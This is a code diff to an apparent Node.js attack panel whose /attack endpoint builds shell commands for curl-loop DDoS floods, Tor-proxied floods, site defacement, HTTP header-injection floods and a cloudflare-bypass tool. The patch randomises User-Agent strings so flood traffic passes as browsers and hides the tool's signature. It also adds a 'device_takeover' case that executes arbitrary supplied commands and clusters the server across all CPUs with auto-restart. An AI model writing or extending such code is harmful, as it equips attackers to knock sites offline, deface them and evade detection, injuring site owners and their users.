@@ -14,6 +14,8 @@ const dns = require('dns');
 const net = require('net');
 const { spawn } = require('child_process');
 const cors = require('cors');
+const cluster = require('cluster');
+const numCPUs = os.cpus().length;
 
 app.use(cors());
 app.use(express.static('public'));
@@ -165,6 +167,18 @@ function executeCommand(command) {
     });
 }
 
+function getRandomUserAgent() {
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
+    ];
+    return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
 app.post('/attack', async (req, res) => {
     let target = req.body.target;
     const attackType = req.body.attackType;
@@ -203,7 +217,7 @@ app.post('/attack', async (req, res) => {
 
     switch (attackType) {
         case 'ddos':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A 'Noodles-DDoS' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A '${getRandomUserAgent()}' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
             break;
         case 'deface':
             const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
@@ -216,7 +230,7 @@ app.post('/attack', async (req, res) => {
             try {
                 const externalIp = await publicIp.v4();
                 log(`Attacker IP: ${externalIp}`);
-                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A 'Noodles-Tor-DDoS' -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
+                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A '${getRandomUserAgent()}' -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
             } catch (error) {
                 log(`Error getting public IP: ${error.message}`);
                 return res.status(500).send(`Error getting public IP: ${error.message}`);
@@ -329,8 +343,8 @@ app.post('/attack', async (req, res) => {
             }
             command = `timeout ${duration} bash -c "${botCommand}"`;
             break;
-            
-         case 'raw_tcp':
+
+        case 'raw_tcp':
             const rawPayload = req.body.rawPayload;
             if (!rawPayload) {
                 log('Error: Raw TCP payload is required for raw_tcp attack.');
@@ -340,13 +354,13 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'custom':
-                const customCommand = req.body.customCommand;
-                if (!customCommand) {
-                    log('Error: Custom command is required for custom attack.');
-                    return res.status(400).send('Custom command is required for custom attack.');
-                }
-                command = customCommand;
-                break;
+            const customCommand = req.body.customCommand;
+            if (!customCommand) {
+                log('Error: Custom command is required for custom attack.');
+                return res.status(400).send('Custom command is required for custom attack.');
+            }
+            command = customCommand;
+            break;
         case 'layer7':
             const layer7Method = req.body.layer7Method;
             const layer7Options = req.body.layer7Options || '';
@@ -358,14 +372,14 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'http_header_injection':
-                const headerName = req.body.headerName;
-                const headerValue = req.body.headerValue;
-                if (!headerName || !headerValue) {
-                    log('Error: Header name and value are required for HTTP header injection attack.');
-                    return res.status(400).send('Header name and value are required for HTTP header injection attack.');
-                }
-                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
-                break;
+            const headerName = req.body.headerName;
+            const headerValue = req.body.headerValue;
+            if (!headerName || !headerValue) {
+                log('Error: Header name and value are required for HTTP header injection attack.');
+                return res.status(400).send('Header name and value are required for HTTP header injection attack.');
+            }
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
+            break;
 
         case 'cc_bypass':
             const ccBypassMethod = req.body.ccBypassMethod;
@@ -376,6 +390,15 @@ app.post('/attack', async (req, res) => {
                 return res.status(400).send('CC Bypass method and data are required');
             }
             command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
+            break;
+        case 'device_takeover':
+            const deviceCommand = req.body.deviceCommand;
+
+            if (!deviceCommand) {
+                log('Error: Device command is required for device takeover');
+                return res.status(400).send('Device command is required for device takeover');
+            }
+            command = `timeout ${duration} bash -c "${deviceCommand}"`;
             break;
 
         default:
@@ -461,7 +484,21 @@ process.on('unhandledRejection', (reason, promise) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server listening on port ${PORT}`);
-    log(`Server started on port ${PORT}`);
-});
+
+if (cluster.isMaster) {
+    console.log(`Master ${process.pid} is running`);
+
+    for (let i = 0; i < numCPUs; i++) {
+        cluster.fork();
+    }
+
+    cluster.on('exit', (worker, code, signal) => {
+        console.log(`worker ${worker.process.pid} died`);
+        cluster.fork();
+    });
+} else {
+    app.listen(PORT, () => {
+        console.log(`Worker ${process.pid} listening on port ${PORT}`);
+        log(`Worker ${process.pid} started on port ${PORT}`);
+    });
+}
